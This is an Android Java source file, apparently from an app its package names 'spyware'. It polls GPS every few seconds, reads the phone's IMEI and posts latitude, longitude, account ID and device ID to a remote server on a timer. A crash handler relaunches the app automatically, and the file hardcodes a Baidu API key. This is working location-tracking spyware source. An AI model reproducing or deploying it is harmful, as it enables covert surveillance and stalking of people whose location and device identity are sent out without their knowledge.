package com.my.spyware;

import java.util.Timer;
import java.util.TimerTask;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Looper;
import android.os.Vibrator;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;
import cn.jpush.android.api.JPushInterface;

import com.baidu.frontia.Frontia;
import com.baidu.frontia.FrontiaApplication;
import com.baidu.location.BDLocation;
import com.baidu.location.BDLocationListener;
import com.baidu.location.GeofenceClient;
import com.baidu.location.LocationClient;
import com.baidu.location.LocationClientOption;
import com.baidu.mapapi.SDKInitializer;
import com.lidroid.xutils.HttpUtils;
import com.lidroid.xutils.exception.HttpException;
import com.lidroid.xutils.http.RequestParams;
import com.lidroid.xutils.http.ResponseInfo;
import com.lidroid.xutils.http.callback.RequestCallBack;
import com.lidroid.xutils.http.client.HttpRequest;
import com.lidroid.xutils.http.client.HttpRequest.HttpMethod;
import com.mdx.mobile.Frame;
import com.mdx.mobile.utils.AbDeviceUtil;
import com.my.spyware.act.ActLauch;

/**
 * 应用入口 1、初始化→assets下配置文件 2、初始化→百度key 3、初始化→JPush 4、初始化→友盟推送 5、设置应用全局异常捕获
 * 
 * @author ljl
 * @version [2014-8-16 上午9:39:58]
 */
public class MApplication extends FrontiaApplication implements Thread.UncaughtExceptionHandler {
    public final String TAG = "MApplication";
    
    private Thread.UncaughtExceptionHandler mDefaultHandler;
    
    public LocationClient mLocationClient;
    
    public GeofenceClient mGeofenceClient;
    
    public MyLocationListener mMyLocationListener;
    
    public Vibrator mVibrator;
    
    public boolean isSendLocation = true;
    
    @Override
    public void onCreate() {
        super.onCreate();
        Frame.init(getApplicationContext());
        Frame.setConnectionTimeout(5 * 60 * 1000);// 设置请求超时时间5分钟
        SDKInitializer.initialize(this);
        Frontia.init(this.getApplicationContext(), "lWGET1eroUKpZiMatyDghwB3");
        F.init(getApplicationContext());
        initJpush();
        initDeviceid();
        initLocation();
    }
    
    private void initJpush() {
        // TODO Auto-generated method stub
        /* 设置开启日志,发布时请关闭日志 */
        JPushInterface.setDebugMode(true);
        /* 初始化 JPush */
        JPushInterface.init(this);
    }
    
    private void initLocation() {
        // TODO Auto-generated method stub
        
        mLocationClient = new LocationClient(this.getApplicationContext());
        setLocationOption();
        mMyLocationListener = new MyLocationListener();
        mLocationClient.registerLocationListener(mMyLocationListener);
        mGeofenceClient = new GeofenceClient(getApplicationContext());
        mVibrator = (Vibrator) getApplicationContext().getSystemService(Service.VIBRATOR_SERVICE);
    }
    
    public void startLocation() {
        if (mLocationClient.isStarted()) {
            mLocationClient.stop();
        }
        mLocationClient.start();
    }
    
    public void stopLocation() {
        if (mLocationClient.isStarted()) {
            mLocationClient.stop();
        }
    }
    
    private void setLocationOption() {
        Log.v(TAG, "application initlocation");
        LocationClientOption option = new LocationClientOption();
        option.setOpenGps(true); // 打开gps
        option.setScanSpan(5000);
        option.setCoorType("bd09ll");
        option.setIsNeedAddress(true);
        mLocationClient.setLocOption(option);
    }
    
    public class MyLocationListener implements BDLocationListener {
        
        @Override
        public void onReceiveLocation(BDLocation location) {
            if (location != null) {
                Log.v(TAG, "location--" + location.getAddrStr() + "city:" + location.getCity());
                F.mLocation = location;
                F.locCity = location.getCity();
            }
            
        }
        
    }
    
    /**
     * 获取设备ID
     * 
     * @author ljl
     * @Description: TODO
     * @param
     * @return void
     * @throws
     */
    private void initDeviceid() {
        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        F.DEVICEID = tm.getDeviceId();
        if (F.DEVICEID == null || F.DEVICEID.length() == 0) {
            F.DEVICEID = AbDeviceUtil.getDeviceid(getApplicationContext());
        }
    }
    
    /**
     * 当剩余内存过低 [一句话功能简述]<BR>
     * [功能详细描述]
     * 
     * @see android.app.Application#onLowMemory()
     */
    @Override
    public void onLowMemory() {
        /* 清除图片软引用 */
        Frame.IconCache.clean();
        /* 清除图片所有缓存软引用+SD */
        // Frame.IconCache.cleanCache();
        super.onLowMemory();
    }
    
    @Override
    public void uncaughtException(Thread thread, Throwable ex) {
        if (!handleException(ex) && mDefaultHandler != null) {
            // 如果用户没有处理则让系统默认的异常处理器来处理
            mDefaultHandler.uncaughtException(thread, ex);
        }
        else {
            try {
                Thread.sleep(2000);
            }
            catch (InterruptedException e) {
                Log.e(TAG, "error : ", e);
            }
            Intent intent = new Intent(getApplicationContext(), ActLauch.class);
            PendingIntent restartIntent = PendingIntent.getActivity(getApplicationContext(),
                    0,
                    intent,
                    Intent.FLAG_ACTIVITY_NEW_TASK);
            // 退出程序
            AlarmManager mgr = (AlarmManager) this.getSystemService(Context.ALARM_SERVICE);
            mgr.set(AlarmManager.RTC, System.currentTimeMillis() + 1000, restartIntent); // 1秒钟后重启应用
            System.exit(0);
        }
    }
    
    /**
     * 自定义错误处理,收集错误信息 发送错误报告等操作均在此完成.
     * 
     * @param ex
     * @return true:如果处理了该异常信息;否则返回false.
     */
    private boolean handleException(Throwable ex) {
        if (ex == null) {
            return false;
        }
        // 使用Toast来显示异常信息
        new Thread() {
            @Override
            public void run() {
                Looper.prepare();
                Toast.makeText(getApplicationContext(), "很抱歉,程序出现异常,即将退出.", Toast.LENGTH_SHORT).show();
                Looper.loop();
            }
        }.start();
        return true;
    }
    
    private Timer timer;
    
    public void sendLocation() {
        if (isSendLocation) {
            Log.v(TAG, "timertask start");
            timer = new Timer();
            MyTimerTask task = new MyTimerTask();
            timer.schedule(task, F.sendLocationTime, F.sendLocationTime);
        }
        else {
            timer.cancel();
        }
    }
    
    class MyTimerTask extends TimerTask {
        @Override
        public void run() {
            // 网络请求
            Log.v(TAG, "poststart");
            if (F.mLocation == null) {
                return;
            }
            String lng = String.valueOf(F.mLocation.getLongitude());
            String lat = String.valueOf(F.mLocation.getLatitude());
            if (!F.isEmpty(lng) && !F.isEmpty(lat)) {
                
                // 实例化HttpUtils对象， 参数设置链接超时
                HttpUtils HTTP_UTILS = new HttpUtils(60 * 1000);
                // 实例化RequestParams对象
                RequestParams requestParams = new RequestParams();
                requestParams.addBodyParameter("lat", lat);
                requestParams.addBodyParameter("lng", lng);
                requestParams.addBodyParameter("account_id", F.userId);
                requestParams.addBodyParameter("deviceid", F.DEVICEID);
                requestParams.addBodyParameter("methodno", "MBUserAddress");
                requestParams.addBodyParameter("debug", "1");
                // String url = "http://10.49.188.109/dw/mobile";
                String url = F.HOST;
                Log.v(TAG, "post" + url);
                // 通过HTTP_UTILS来发送post请求， 并书写回调函数
                HTTP_UTILS.send(HttpMethod.POST,
                        url,
                        requestParams,
                        new com.lidroid.xutils.http.callback.RequestCallBack<String>() {
                            @Override
                            public void onFailure(HttpException httpException, String arg1) {
                                Log.v(TAG, "fail:" + httpException.getMessage());
                            }
                            
                            @Override
                            public void onSuccess(ResponseInfo<String> responseInfo) {
                                Log.v(TAG, "success:" + responseInfo.result);
                            }
                        });
            }
            
        }
    };
    
}
